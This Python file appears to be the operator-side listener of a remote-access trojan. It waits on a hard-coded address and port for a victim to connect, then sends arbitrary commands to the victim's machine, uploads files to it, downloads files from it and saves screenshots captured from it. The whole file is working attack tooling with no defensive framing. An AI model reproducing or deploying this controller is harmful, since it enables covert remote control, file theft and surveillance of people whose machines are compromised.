import socket
import json
import base64


class server:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = server.accept()
        print("[+] Got a connection from : " + str(address) + "\n")

    def send_data(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("UTF-8"))

    def receive_data(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(8024)
                return json.loads(json_data.decode('windows-1252'))
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.send_data(command)

        if command[0] == "exit":
            self.connection.close
            exit()

        return self.receive_data()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] The file was Downloaded successfully"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        i = 0
        # le pour les num des screen
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result.encode())

                if command[0] == "screen" and "[-] Error " not in result:
                    result = self.write_file(
                        f"screenshot{i}.png", result.encode())
                    i = i+1

            except Exception:
                result = "[-] Error during command execution server side"

            print(result)


my_server = server("192.168.0.2", 5555)
my_server.run()
